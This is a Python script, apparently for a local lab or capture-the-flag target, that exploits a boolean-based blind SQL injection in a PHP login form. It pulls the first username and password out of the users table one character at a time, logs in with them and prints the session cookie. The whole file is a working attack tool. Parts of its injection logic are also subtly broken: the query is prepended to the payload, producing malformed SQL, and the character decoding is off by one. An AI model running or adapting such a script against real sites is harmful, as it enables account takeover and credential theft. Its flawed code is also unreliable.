import requests
import sys
import time

# Configuration
BASE_URL = "http://127.0.0.1:32815"
LOGIN_URL = f"{BASE_URL}/index.php"

# Session for requests
session = requests.Session()

# Headers
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
}

def test_injection(payload):
    """Test SQL injection payload and return True if condition is TRUE (username exists)"""
    data = {
        "username": payload,
        "password": "dummy",
        "submit": "submit"
    }
    
    try:
        response = session.post(LOGIN_URL, data=data, headers=headers)
        response_text = response.text
        
        # TRUE condition: response contains "password" (username exists but wrong password)
        # FALSE condition: response contains "username" (username doesn't exist)
        if "password" in response_text:
            return True
        elif "username" in response_text:
            return False
        else:
            print(f"[!] Unexpected response: {response_text[:200]}")
            return False
    except Exception as e:
        print(f"[!] Request error: {e}")
        return False

def extract_text(query, max_length=50):
    """Extract text using binary search on ASCII values"""
    result = ""
    print(f"[+] Extracting data with query: {query}")
    
    for position in range(1, max_length + 1):
        char_found = False
        low = 32  # Space
        high = 126  # ~
        
        while low <= high:
            mid = (low + high) // 2
            test_query = f"{query} AND ASCII(SUBSTRING(({query}),{position},1))>{mid}-- "
            
            # Craft payload for boolean-based blind
            payload = f"admin' AND {test_query}"
            
            if test_injection(payload):
                low = mid + 1
            else:
                high = mid - 1
        
        # After binary search, low-1 is the character
        char_code = low - 1
        
        # Verify it's a valid character
        if 32 <= char_code <= 126:
            char = chr(char_code)
            result += char
            print(f"[+] Position {position}: '{char}' (ASCII: {char_code})")
            char_found = True
        else:
            # Check if it's a NULL or end of string
            null_check = f"admin' AND ASCII(SUBSTRING(({query}),{position},1))=0-- "
            if not test_injection(null_check):
                print(f"[+] End of string reached at position {position-1}")
                break
            else:
                # Might be extended ASCII or unicode, try to get it
                char = chr(char_code)
                result += char
                print(f"[+] Position {position}: '{char}' (ASCII: {char_code})")
                char_found = True
        
        if not char_found:
            break
    
    return result.strip()

def extract_username():
    """Extract admin username"""
    print("\n" + "="*60)
    print("EXTRACTING ADMIN USERNAME")
    print("="*60)
    
    # Query to get first username from users table
    query = "SELECT username FROM users LIMIT 1"
    username = extract_text(query)
    print(f"\n[+] Extracted username: '{username}'")
    return username

def extract_password(username):
    """Extract password hash for given username"""
    print("\n" + "="*60)
    print(f"EXTRACTING PASSWORD FOR USER: {username}")
    print("="*60)
    
    # Query to get password for the username
    query = f"SELECT password FROM users WHERE username='{username}' LIMIT 1"
    password_hash = extract_text(query, max_length=100)
    print(f"\n[+] Extracted password hash: '{password_hash}'")
    return password_hash

def authenticate(username, password):
    """Authenticate with extracted credentials and return session cookie"""
    print("\n" + "="*60)
    print("AUTHENTICATING WITH EXTRACTED CREDENTIALS")
    print("="*60)
    
    data = {
        "username": username,
        "password": password,
        "submit": "submit"
    }
    
    try:
        response = session.post(LOGIN_URL, data=data, headers=headers)
        response_text = response.text
        
        print(f"[+] Response: {response_text}")
        
        # Check if authentication was successful
        if "Success" in response_text:
            print("[+] Authentication successful!")
            
            # Get PHPSESSID cookie
            cookies = session.cookies.get_dict()
            if "PHPSESSID" in cookies:
                phpsessid = cookies["PHPSESSID"]
                print(f"[+] PHPSESSID: {phpsessid}")
                return phpsessid
            else:
                print("[!] PHPSESSID not found in cookies")
                print(f"[+] Available cookies: {cookies}")
                return None
        else:
            print(f"[!] Authentication failed. Response: {response_text[:200]}")
            return None
    except Exception as e:
        print(f"[!] Authentication error: {e}")
        return None

def main():
    print("="*60)
    print("BOOLEAN-BASED BLIND SQL INJECTION EXPLOIT")
    print(f"Target: {BASE_URL}")
    print("="*60)
    
    # Test the injection works
    print("\n[+] Testing injection point...")
    
    # TRUE condition test
    test_true = "admin' AND 1=1-- "
    if test_injection(test_true):
        print("[+] TRUE condition test passed")
    else:
        print("[!] TRUE condition test failed - injection may not work")
        return
    
    # FALSE condition test
    test_false = "admin' AND 1=2-- "
    if not test_injection(test_false):
        print("[+] FALSE condition test passed")
    else:
        print("[!] FALSE condition test failed - injection may not work")
        return
    
    print("[+] Injection confirmed working!")
    
    # Extract username
    username = extract_username()
    if not username:
        print("[!] Failed to extract username")
        return
    
    # Extract password hash
    password_hash = extract_password(username)
    if not password_hash:
        print("[!] Failed to extract password hash")
        return
    
    print(f"\n[+] CREDENTIALS EXTRACTED:")
    print(f"    Username: {username}")
    print(f"    Password: {password_hash}")
    
    # Try to authenticate with extracted credentials
    phpsessid = authenticate(username, password_hash)
    
    if phpsessid:
        print("\n" + "="*60)
        print("EXPLOIT SUCCESSFUL!")
        print("="*60)
        print(f"Username: {username}")
        print(f"Password: {password_hash}")
        print(f"PHPSESSID: {phpsessid}")
        print("\nYou can now access /dashboard.php with this session cookie")
    else:
        print("\n[!] Exploit completed but authentication failed")
        print(f"Extracted credentials - Username: {username}, Password: {password_hash}")

if __name__ == "__main__":
    main()
